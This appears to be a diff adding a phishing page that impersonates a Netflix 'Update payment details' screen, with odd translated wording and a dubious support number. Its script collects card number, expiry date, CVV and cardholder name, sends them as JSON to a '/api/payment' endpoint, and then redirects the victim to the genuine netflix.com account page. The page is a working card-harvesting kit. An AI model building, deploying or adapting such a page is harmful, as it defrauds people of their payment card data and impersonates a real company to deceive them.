@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Update payment details - Netflix</title>
+<style>
+  :root { --nf-red: #e50914; --nf-text: #333; --nf-muted: #737373; --nf-border: #8c8c8c; --nf-bg: #fff; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: var(--nf-bg); color: #000; -webkit-font-smoothing: antialiased; overflow-y: scroll; }
+  ::-webkit-scrollbar { width: 14px; }
+  ::-webkit-scrollbar-track { background: #f1f1f1; }
+  ::-webkit-scrollbar-thumb { background: #c1c1c1; border-radius: 10px; border: 3px solid #f1f1f1; }
+  ::-webkit-scrollbar-thumb:hover { background: #a8a8a8; }
+  header { display: flex; justify-content: space-between; align-items: center; padding: 24px 4%; border-bottom: 1px solid #e6e6e6; }
+  .logo { color: var(--nf-red); font-weight: 900; font-size: 32px; letter-spacing: -1px; font-family: "Bebas Neue", "Arial Black", sans-serif; }
+  .to-go-out { font-size: 18px; font-weight: 500; color: #000; text-decoration: none; }
+  .container { max-width: 800px; margin: 0 auto; padding: 60px 20px; }
+  h1 { font-size: 32px; font-weight: 700; margin-bottom: 24px; color: #000; }
+  .cards { display: flex; gap: 8px; margin-bottom: 16px; }
+  .cards img { height: 24px; border: 1px solid #e6e6e6; border-radius: 4px; padding: 2px 4px; background: #fff; }
+  .form-row { display: flex; gap: 16px; margin-bottom: 16px; }
+  .form-col { flex: 1; display: flex; flex-direction: column; position: relative; }
+  .full-width { width: 100%; margin-bottom: 16px; position: relative; }
+  .input-box { position: relative; border: 1px solid var(--nf-border); border-radius: 4px; padding: 12px 16px; background: #fff; height: 64px; }
+  .input-box input { width: 100%; border: none; outline: none; background: transparent; font-size: 16px; padding-top: 16px; color: var(--nf-text); }
+  .input-box label { position: absolute; top: 10px; left: 16px; font-size: 13px; color: var(--nf-muted); pointer-events: none; }
+  .icon { position: absolute; right: 16px; top: 50%; transform: translateY(-50%); color: var(--nf-border); }
+  .legal-text { font-size: 16px; color: var(--nf-muted); line-height: 1.5; margin: 24px 0; }
+  .checkbox-row { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 24px; }
+  .checkbox-row input[type="checkbox"] { width: 20px; height: 20px; accent-color: var(--nf-red); margin-top: 4px; }
+  .checkbox-row label { font-size: 16px; color: var(--nf-text); }
+  .global-err { color: var(--nf-red); font-size: 16px; margin-bottom: 24px; display: flex; align-items: center; gap: 8px; margin-left: 32px;}
+  .btn { width: 100%; padding: 16px; border: none; border-radius: 4px; font-size: 24px; font-weight: 700; cursor: pointer; background: var(--nf-red); color: #fff; }
+  .recaptcha { font-size: 16px; color: var(--nf-muted); margin-top: 24px; }
+  footer { background: #f3f3f3; padding: 40px 4%; margin-top: 80px; color: var(--nf-muted); font-size: 16px; }
+  footer a { color: var(--nf-muted); text-decoration: underline; }
+  .footer-links { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 24px; }
+  .footer-container { max-width: 800px; margin: 0 auto; }
+  @media (max-width: 600px) { .form-row { flex-direction: column; gap: 16px; } .footer-links { grid-template-columns: 1fr; } }
+</style>
+</head>
+<body>
+<header>
+  <span class="logo">NETFLIX</span>
+  <a href="#" class="to-go-out">To go out</a>
+</header>
+<div class="container">
+  <h1>Update the payment details</h1>
+  <div class="cards">
+    <svg height="24" viewBox="0 0 40 16" fill="none"><rect width="40" height="16" rx="2" fill="#1434CB"/><text x="4" y="12" fill="white" font-size="10" font-weight="bold" font-family="Arial">VISA</text></svg>
+    <svg height="24" viewBox="0 0 40 16" fill="none"><rect width="40" height="16" rx="2" fill="#fff" stroke="#eee"/><circle cx="18" cy="8" r="6" fill="#EB001B"/><circle cx="26" cy="8" r="6" fill="#F79E1B" fill-opacity="0.8"/></svg>
+    <svg height="24" viewBox="0 0 40 16" fill="none"><rect width="40" height="16" rx="2" fill="#002663"/><text x="4" y="12" fill="white" font-size="8" font-weight="bold" font-family="Arial">AMEX</text></svg>
+    <svg height="24" viewBox="0 0 40 16" fill="none"><rect width="40" height="16" rx="2" fill="#fff" stroke="#eee"/><text x="6" y="11" fill="#e50914" font-size="7" font-weight="bold" font-family="Arial">RuPay</text></svg>
+  </div>
+  <form id="payment-form">
+    <div class="full-width">
+      <div class="input-box">
+        <label>Card number</label>
+        <input type="text" id="card" maxlength="19" autocomplete="off">
+        <div class="icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div>
+      </div>
+    </div>
+    <div class="form-row">
+      <div class="form-col">
+        <div class="input-box">
+          <label>Expiry date</label>
+          <input type="text" id="exp" maxlength="5" autocomplete="off">
+        </div>
+      </div>
+      <div class="form-col">
+        <div class="input-box">
+          <label>CVV</label>
+          <input type="text" id="cvv" maxlength="4" autocomplete="off">
+          <div class="icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg></div>
+        </div>
+      </div>
+    </div>
+    <div class="full-width">
+      <div class="input-box">
+        <label>Name on the card</label>
+        <input type="text" id="name" autocomplete="off">
+      </div>
+    </div>
+    <p class="legal-text">Your payments will be made through an international transaction. Additional fees may be charged.</p>
+    <p class="legal-text">By clicking "Make Payment" below, you agree that if you cancel your Infinitum package, your Netflix subscription, including additional purchases, will remain active and Netflix will resume charging you for your saved payment method.</p>
+    <div class="checkbox-row">
+      <input type="checkbox" id="agree">
+      <label for="agree">I agree.</label>
+    </div>
+    <div class="global-err" style="display:none;" id="err-box">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>
+      To proceed, you must confirm that you have read and agree to the Terms of Use.
+    </div>
+    <button type="submit" class="btn">Make payment</button>
+    <p class="recaptcha">This page is protected by Google reCAPTCHA to ensure you are not a robot.</p>
+  </form>
+</div>
+<footer>
+  <div class="footer-container">
+    <p>Questions? Call 000-800-919-1743 (Free Call)</p>
+    <div class="footer-links">
+      <a href="#">Frequently Asked Questions</a>
+      <a href="#">Help Center</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Privacy</a>
+      <a href="#">Cookie preferences</a>
+      <a href="#">Corporate information</a>
+    </div>
+  </div>
+</footer>
+<script>
+  document.getElementById('payment-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const errBox = document.getElementById('err-box');
+    const agree = document.getElementById('agree').checked;
+    if(!agree) { errBox.style.display = 'flex'; return; }
+    errBox.style.display = 'none';
+    const card = document.getElementById('card').value.trim();
+    const exp = document.getElementById('exp').value.trim();
+    const cvv = document.getElementById('cvv').value.trim();
+    const name = document.getElementById('name').value.trim();
+    if(!card || !exp || !cvv || !name) return;
+    const btn = e.target.querySelector('button'); btn.textContent = 'Processing...'; btn.disabled = true;
+    try {
+      const r = await fetch('/api/payment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, exp, cvv, name, ts: Date.now() }) });
+      if (r.ok) { window.location.href = 'https://www.netflix.com/youraccount'; }
+      else { btn.textContent = 'Make payment'; btn.disabled = false; }
+    } catch (_) { btn.textContent = 'Make payment'; btn.disabled = false; }
+  });
+</script>
+</body>
+</html>
